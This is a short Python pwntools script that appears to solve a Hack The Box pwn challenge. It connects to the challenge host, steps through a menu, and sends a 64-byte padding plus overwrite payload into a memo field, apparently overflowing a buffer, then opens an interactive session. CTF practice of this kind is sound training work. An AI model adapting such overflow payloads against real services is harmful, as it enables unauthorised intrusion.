import logging
from pwn import *
from time import sleep

logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

HOST = "docker.hackthebox.eu"
PORT = 31940

def main():
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

    ###payload###
    payload = b"A" * 64
    payload += b"fuck"
    
    _ = target.recvuntil("Please enter an operation number: ")
    target.sendline("1")
    sleep(1)
    _ = target.recvuntil("First name: ")
    target.sendline("AAAA")
    sleep(1)
    _ = target.recvuntil("Last name: ")
    target.sendline("BBBB")
    sleep(1)
    
    _ = target.recvuntil("Please enter an operation number: ")
    target.sendline("3")
    sleep(1)
    
    _ = target.recvuntil("Please enter an operation number: ")
    target.sendline("4")
    sleep(1)
    
    _ = target.recvuntil("Please enter memo:")
    target.sendline(payload)
    sleep(1)
    
    _ = target.recvuntil("Please enter an operation number: ")
    target.sendline("5")
    sleep(1)
    
    ret = target.recvuntil("")
        
        
    target.interactive()

if __name__ == "__main__":
    main()
